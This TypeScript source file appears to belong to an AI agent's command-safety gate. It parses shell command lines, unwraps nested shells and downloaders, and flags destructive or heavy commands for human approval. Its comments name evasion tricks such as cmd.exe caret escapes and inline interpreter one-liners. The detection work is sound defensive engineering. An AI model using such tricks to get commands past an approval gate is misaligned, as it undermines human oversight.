/** Where one download unit writes, by program; null where the text does not say. */
function fetcherTargets(program: string, args: readonly string[]): Array<string | null> {
  const lower = args.map((a) => a.toLowerCase());
  switch (program) {
    case 'curl': {
      const outDir = flagValues(args, (f) => f === '--output-dir')[0];
      const files = [
        ...flagValues(args, (f) => f === '--output'),
        ...shortValues(args, 'curl', 'o'),
      ];
      const remote =
        args.some((a) => /^--remote-name(-all)?$/.test(a)) ||
        shortOptions(args, 'curl').some((o) => o.option === 'O');
      const targets = files.filter((f) => f !== '-').map((f) => joinPath(outDir ?? '.', f));
      if (remote) targets.push(outDir ?? '.');
      return targets;
    }
    case 'wget': {
      const docs = [
        ...flagValues(args, (f) => f === '--output-document'),
        ...shortValues(args, 'wget', 'O'),
      ];
      const logs = [
        ...flagValues(args, (f) => f === '--output-file' || f === '--append-output'),
        ...shortValues(args, 'wget', 'o'),
        ...shortValues(args, 'wget', 'a'),
      ];
      const prefix = [
        ...flagValues(args, (f) => f === '--directory-prefix'),
        ...shortValues(args, 'wget', 'P'),
      ][0];
      const targets = [...docs.filter((d) => d !== '-'), ...logs].map((f) =>
        joinPath(prefix ?? '.', f),
      );
      if (docs.length === 0) targets.push(prefix ?? '.');
      return targets;
    }
    case 'invoke-webrequest':
    case 'iwr':
    case 'invoke-restmethod':
    case 'irm':
      // Without -OutFile the content is returned, not written.
      return flagValues(args, (f) => /^-outf/i.test(f));
    case 'start-bitstransfer': {
      const dest = flagValues(args, (f) => /^-dest/i.test(f));
      // Positional destination: which word is a value and which a switch is
      // not readable without the cmdlet's signature, so it asks.
      return dest.length > 0 ? dest : [null];
    }
    case 'aria2c': {
      const dir =
        [...flagValues(args, (f) => f === '--dir'), ...shortValues(args, 'aria2c', 'd')][0] ?? '.';
      const outs = [...flagValues(args, (f) => f === '--out'), ...shortValues(args, 'aria2c', 'o')];
      return outs.length > 0 ? outs.map((o) => joinPath(dir, o)) : [dir];
    }
    case 'git': {
      // `git [global options] clone [options] URL [DIR]`, and `git -C dir lfs pull`.
      const base = flagValues(args, (f) => f === '-C')[0] ?? '.';
      const sub = lower.indexOf('clone');
      if (sub < 0) return [base];
      const rest = args.slice(sub + 1);
      const positional: string[] = [];
      for (let i = 0; i < rest.length; i++) {
        const a = rest[i] ?? '';
        if (a.startsWith('-')) {
          if (!a.includes('=') && GIT_CLONE_VALUE_FLAGS.has(a)) i++;
          continue;
        }
        positional.push(a);
      }
      const separate = flagValues(rest, (f) => f === '--separate-git-dir');
      return [joinPath(base, positional[1] ?? '.'), ...separate];
    }
    case 'pip':
    case 'pip3':
      return [flagValues(args, (f) => f === '-d' || f === '--dest', '-d')[0] ?? '.'];
    case 'hf':
    case 'huggingface-cli':
      // Without --local-dir, the Hugging Face cache: the program's own store.
      return flagValues(args, (f) => f === '--local-dir');
    case 'comfy':
    case 'ollama':
    case 'docker':
    case 'podman':
    case 'docker-compose':
    case 'podman-compose':
      // Their own store (the ComfyUI install, the model or image store): the
      // command names no path.
      return [];
    default:
      // A fetcher this reading does not know the flags of: it asks.
      return [null];
  }
}

/** `git clone` options that take a value as the next word. */
const GIT_CLONE_VALUE_FLAGS = new Set([
  '-b',
  '--branch',
  '-o',
  '--origin',
  '-c',
  '--config',
  '-u',
  '--upload-pack',
  '-j',
  '--jobs',
  '--depth',
  '--reference',
  '--reference-if-able',
  '--separate-git-dir',
  '--template',
  '--filter',
  '--shallow-since',
  '--shallow-exclude',
  '--server-option',
  '--bundle-uri',
]);

/**
 * Where the shell writes a line's output: `> file`, `>> file`, `>| file`, and
 * the same for another descriptor (`2> file`, the error log of a download) or
 * both (`&> file`). A redirection to a descriptor (`2>&1`, `>&2`) names no file.
 */
function redirectionTargets(cmd: string): string[] {
  const targets: string[] = [];
  for (const m of cmd.matchAll(/(?:^|[^<>])(?:&|\d+)?>>?\|?\s*("[^"]*"|'[^']*'|[^\s;&|()<>]+)/g)) {
    const t = stripQuotes(m[1] ?? '');
    if (t.startsWith('&')) continue;
    targets.push(t);
  }
  return targets;
}

/** Where a program at the end of a pipe writes what it reads: `Out-File x`, `tee x`. */
function pipeWriterTargets(program: string, args: readonly string[]): string[] {
  if (['out-file', 'set-content', 'add-content', 'tee-object'].includes(program)) {
    const named = flagValues(args, (f) => /^-(file)?path$|^-literalpath$/i.test(f));
    return named.length > 0 ? named : args.filter((a) => !a.startsWith('-')).slice(0, 1);
  }
  if (program === 'tee') return args.filter((a) => !a.startsWith('-'));
  return [];
}

/** True when `re` matches at the very start of `text`. */
function startsWithMatch(re: RegExp, text: string): boolean {
  const m = new RegExp(re.source, re.flags.replace('g', '')).exec(text);
  return m !== null && m.index === 0;
}

const SHELL_WRAPPERS = new Set(['sh', 'bash', 'zsh', 'ksh', 'dash', 'ash', 'fish']);

/** `FOO=1` at index `i` of a segment, before any program word: an assignment, not the program. */
function isAssignmentPrefix(segment: readonly string[], i: number): boolean {
  return segment.slice(0, i + 1).every((t) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(t));
}

/**
 * The commands a command line actually runs, as token lists whose first token
 * is the program (its basename, lower-cased, without `.exe`): each segment,
 * the module of `python -m`, and what `bash -c`, `cmd /c`,
 * `powershell -Command`, `xargs`, `find -exec` and `$(…)` / backticks run
 * inside it.
 */
export function commandUnits(cmd: string, depth = 0): string[][] {
  if (depth > 4 || typeof cmd !== 'string' || cmd.trim() === '') return [];
  const units: string[][] = [];
  const inner = (text: string) => units.push(...commandUnits(text, depth + 1));
  for (const m of cmd.matchAll(/\$\(([^()]*)\)|`([^`]*)`/g)) inner(m[1] ?? m[2] ?? '');
  for (const segment of splitShellWords(cmd)) {
    // `FOO=1 rm -rf build`: variables set for the command are not the program
    // (review of PR #476).
    const tokens = skipPassthroughLeaders(
      segment.filter((_, i) => !isAssignmentPrefix(segment, i)),
    );
    const head = tokens[0];
    if (head === undefined) continue;
    const program = interpreterBasename(head);
    const args = tokens.slice(1);
    units.push([program, ...args]);
    const lower = args.map((a) => a.toLowerCase());
    // `python -m pip install x` runs pip: the module is the program (review of
    // PR #476; main caught it by reading the whole text).
    if (interpreterKind(program) === 'python') {
      const m = lower.indexOf('-m');
      const module = m >= 0 ? args[m + 1] : undefined;
      if (module !== undefined) units.push([module.toLowerCase(), ...args.slice(m + 2)]);
    }
    if (SHELL_WRAPPERS.has(program)) {
      const i = lower.indexOf('-c');
      if (i >= 0 && args[i + 1] !== undefined) inner(args[i + 1] ?? '');
    } else if (program === 'cmd') {
      const i = lower.findIndex((a) => a === '/c' || a === '/k');
      if (i >= 0) inner(args.slice(i + 1).join(' '));
    } else if (program === 'powershell' || program === 'pwsh') {
      const i = lower.findIndex((a) => a === '-command' || a === '-c');
      if (i >= 0) inner(args.slice(i + 1).join(' '));
    } else if (program === 'xargs') {
      const rest = args.slice(args.findIndex((a) => !a.startsWith('-')));
      if (rest.length > 0 && !rest[0]?.startsWith('-')) inner(rest.join(' '));
    } else if (program === 'find') {
      const i = lower.findIndex((a) => a === '-exec' || a === '-execdir' || a === '-ok');
      if (i >= 0) {
        const end = args.findIndex((a, j) => j > i && (a === ';' || a === '\\;' || a === '+'));
        inner(args.slice(i + 1, end > i ? end : undefined).join(' '));
      }
    }
  }
  return units;
}

/**
 * A command cut into its segments (`;`, `&&`, `||`, `|`, newlines) and each
 * segment into words, quotes honoured and removed: `python a.py "C:/My
 * Files/x.csv"` is three words, not four. Redirection targets are words too.
 */
export function splitShellWords(cmd: string): string[][] {
  const segments: string[][] = [];
  let words: string[] = [];
  let word = '';
  let inWord = false;
  let quote: '"' | "'" | null = null;
  const endWord = (): void => {
    if (inWord) words.push(word);
    word = '';
    inWord = false;
  };
  const endSegment = (): void => {
    endWord();
    if (words.length > 0) segments.push(words);
    words = [];
  };
  let escaped = false;
  for (const ch of cmd) {
    if (escaped) {
      word += ch;
      inWord = true;
      escaped = false;
      continue;
    }
    if (quote !== null) {
      if (ch === quote) quote = null;
      else word += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      inWord = true;
      continue;
    }
    // cmd.exe `^` escapes the next character: `r^m` runs `rm`. A backslash is
    // kept: in a Windows path (`C:\x`) it is a separator, not an escape.
    if (ch === '^') {
      escaped = true;
      continue;
    }
    if (ch === ';' || ch === '|' || ch === '&' || ch === '\n' || ch === '\r') {
      endSegment();
      continue;
    }
    if (ch === '>' || ch === '<' || /\s/.test(ch)) {
      endWord();
      continue;
    }
    word += ch;
    inWord = true;
  }
  endSegment();
  return segments;
}

/**
 * True when `cmd` performs a destructive or heavy, hard-to-undo action. Used by
 * the `destructive_gate` autonomy level: such a command keeps its approval gate
 * while ordinary commands auto-run. Catastrophic commands are a subset (always
 * true here too).
 */
export function isDestructiveOrHeavyCommand(cmd: string): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  // Catastrophic (machine-destroyers) and opaque interpreter-eval both keep
  // their gate under destructive_gate. Inline-eval is no longer catastrophic
  // (approvable), but it stays "heavy" here so destructive_gate still asks a
  // human before running an un-inspectable one-liner.
  if (isCatastrophicCommand(cmd) || isInlineInterpreterEvalCommand(cmd)) return true;
  // Every program only asked for its version or help: nothing happens.
  const units = commandUnits(withoutRedirections(cmd));
  if (units.length > 0 && units.every(isReadUnit)) return false;
  const c = normalizeSlashes(cmd.trim());
  return DESTRUCTIVE_PATTERNS.some((re) => re.test(c)) || units.some(curlWritesAFile);
}

/** The read flags the catastrophic floor lets through: never `-h` (`shutdown -h` halts). */
const FLOOR_READ_FLAGS = new Set(['--help', '--version', '/?']);

/** The flags that make a program print its version or its help, and exit. */
const VERSION_OR_HELP = new Set(['--version', '-V', '--help', '-h', '-?', '/?']);

/**
 * A program called only for its version or its help (`aria2c --version`,
 * `wget -h`) prints and exits: it is no kind of action, whatever the program
 * does otherwise (Reviewer A, #582; the class of #552, a read taken for the
 * action it is about). One more word, an URL or a subcommand, and it is the
 * program at work again.
 */
function isVersionOrHelpOnly(unit: readonly string[]): boolean {
  return unit.length >= 2 && unit.slice(1).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * The help of a SUBCOMMAND: words, then only version or help flags (`pip
 * download --help`, `comfy model download --help`, `ollama pull llama3 -h`).
 */
function isSubcommandHelp(unit: readonly string[]): boolean {
  const args = unit.slice(1);
  const firstFlag = args.findIndex((t) => t.startsWith('-') || t.startsWith('/'));
  if (firstFlag <= 0) return false;
  return args.slice(firstFlag).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * The kinds whose programs all print the help of a subcommand and exit: the
 * fetchers and installers (pip, npm, comfy, docker, git, hf, ollama, wget…).
 * Not the others: cmd's `del` and `rd` read `--help` as one more file name,
 * bash's `kill` still sends its signal (Reviewer A, #582 pass 2).
 */
const SUBCOMMAND_HELP_EXCUSES: ReadonlySet<StaticShellCategory> = new Set([
  'download',
  'install_software',
]);

/** The kinds of one command unit, read from its patterns, before any excuse. */
function patternKinds(unit: readonly string[]): Array<keyof typeof STATIC_SHELL_CATEGORY_PATTERNS> {
  const text = normalizeSlashes(unit.join(' '));
  return (
    Object.entries(STATIC_SHELL_CATEGORY_PATTERNS) as Array<
      [keyof typeof STATIC_SHELL_CATEGORY_PATTERNS, readonly RegExp[]]
    >
  )
    .filter(
      ([category, patterns]) =>
        patterns.some((re) => startsWithMatch(re, text)) ||
        (category === 'download' && curlWritesAFile(unit)),
    )
    .map(([category]) => category);
}

/**
 * A `curl` that writes a file: the same reading as where it writes
 * (`fetcherTargets`), so the kind and the target never disagree (#614, revue
 * Nodal de la PR #618, passe 3 : `-sLoC:\x` échappait aux deux).
 */
function curlWritesAFile(unit: readonly string[]): boolean {
  return unit[0] === 'curl' && fetcherTargets('curl', unit.slice(1)).length > 0;
}

/** The kinds one command unit performs: none for a version or help check. */
function unitCategories(unit: readonly string[]): StaticShellCategory[] {
  if (isVersionOrHelpOnly(unit)) return [];
  const kinds = patternKinds(unit);
  return isSubcommandHelp(unit) ? kinds.filter((k) => !SUBCOMMAND_HELP_EXCUSES.has(k)) : kinds;
}

/** A unit that only prints: a version or help check, or the help of a fetch or install subcommand. */
function isReadUnit(unit: readonly string[]): boolean {
  if (isVersionOrHelpOnly(unit)) return true;
  if (!isSubcommandHelp(unit)) return false;
  const kinds = patternKinds(unit);
  return kinds.length > 0 && kinds.every((k) => SUBCOMMAND_HELP_EXCUSES.has(k));
}

/**
 * The command with its redirections removed (`2>&1`, `> /dev/null`, `>> log`,
 * `< in`): they are the shell's, not the program's arguments, and the
 * tokenizer kept their fd and target as words (`wget --version 2>&1` read
 * as `wget --version 2` then `1`).
 */
function withoutRedirections(cmd: string): string {
  return cmd.replace(
    /(^|\s)(?:\d|&|\*)?(?:>>?|<)(?:&\d+|\s*(?:"[^"]*"|'[^']*'|[^\s;&|()<>]+))/g,
    '$1',
  );
}
